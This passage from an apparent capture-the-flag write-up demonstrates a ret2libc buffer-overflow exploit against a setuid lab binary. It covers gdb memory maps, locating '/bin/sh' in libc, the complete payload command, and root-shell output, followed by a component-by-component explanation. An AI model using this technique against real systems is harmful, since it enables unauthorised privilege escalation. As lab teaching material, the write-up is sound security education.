        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb)
```

As we can see in the memory address range between **`0xb7e2c000`** and **`0xb7fd2000`**, it uses **`/lib/i386-linux-gnu/libc-2.15.so`**.
Let's search for **`"/bin/sh"`** in this memory range.

```
(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
0xb7f8cc58
1 pattern found.
```

``` 
"/bin/sh" = 0xb7f8cc58 
little endian = \x58\xcc\xf8\b7
```

Now that we have reached our goal, we have a memory address for the system function plus another memory address for "/bin/sh".

Therefore, it's time to exploit the vulnerability.

```
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "A"*4 + "\x58\xcc\xf8\xb7"')

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���

# whoami
root

# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
```


### How did we exploit the vulnerability?

```
Let's break down each component of our exploit:

1. Buffer Overflow with "A"*140
   - Fills the buffer with 140 'A' characters
   - Overflows past the buffer's boundaries
   - Overwrites the saved EBP (Base Pointer)
   - Positions us to control the return address (EIP)

2. System Function Address "\x60\xb0\xe6\xb7"
   - Address of libc's system() function
   - Written in little-endian format
   - Overwrites the return address
   - Program execution will jump here

3. Return Address Placeholder "A"*4
   - 4 bytes of dummy data
   - Would normally be the return address after system() call
   - Not important since we won't return from shell
   - Could be any 4 bytes of data

4. Shell String Address "\x58\xcc\xf8\xb7"
   - Points to "/bin/sh" string in memory
   - Found in libc memory space
   - Written in little-endian format
   - Passed as argument to system()
```

FINALLY WE ARE ROOT #9 ;D